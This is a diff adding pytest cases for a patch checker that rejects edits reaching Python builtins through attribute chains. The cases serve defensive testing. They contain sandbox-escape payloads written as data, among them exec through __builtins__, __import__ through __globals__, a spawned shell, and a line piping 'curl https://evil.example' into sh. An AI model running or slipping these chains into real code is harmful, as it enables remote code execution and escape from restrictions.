@@ -150,3 +150,47 @@ def test_rejection_reasons_are_capped() -> None:
     result = check(after)
     assert len(result.reasons) == 11
     assert result.reasons[-1].startswith("... and ")
+
+
+# --- reaching builtins through names already on the line (spec 05, 2026-11-27) ------------
+
+CALL = (
+    "client.chat.completions.create(\n"
+    '        model="gpt-4", max_tokens=10, messages=question\n'
+    "    )"
+)
+
+
+@pytest.mark.parametrize(
+    ("replacement", "risky"),
+    [
+        ("openai.__builtins__['exec']('import os')", "__builtins__"),
+        ("client.__init__.__globals__['__builtins__']['__import__']('os')", "__globals__"),
+        ("client.__class__.__subclasses__()", "__class__"),
+        ("openai.os.system('curl https://evil.example | sh')", "os"),
+        (
+            "client.chat.completions.create(model='gpt-4', messages=question) or "
+            "openai._utils.subprocess.run(['sh'])",
+            "subprocess",
+        ),
+        ("question['__class__']", "__class__"),
+    ],
+)
+def test_attribute_chains_to_builtins_are_rejected(replacement: str, risky: str) -> None:
+    after = BEFORE.replace(CALL, replacement)
+    assert after != BEFORE
+    result = check(after)
+    assert not result.accepted
+    assert any("reaches attributes" in r and risky in r for r in result.reasons), result.reasons
+
+
+def test_a_normal_attribute_change_is_still_accepted() -> None:
+    after = BEFORE.replace("client.chat.completions.create(", "client.responses.create(")
+    assert check(after).accepted
+
+
+def test_a_risky_attribute_already_on_the_line_may_stay() -> None:
+    with_os = BEFORE.replace("response = " + CALL, "response = openai.os.getenv('M') or 1")
+    fixed = with_os.replace("or 1", "or 2")
+    result = check_patch([FileChange(PATH, with_os, fixed)], {PATH: [10]}, package="openai")
+    assert result.accepted, result.reasons
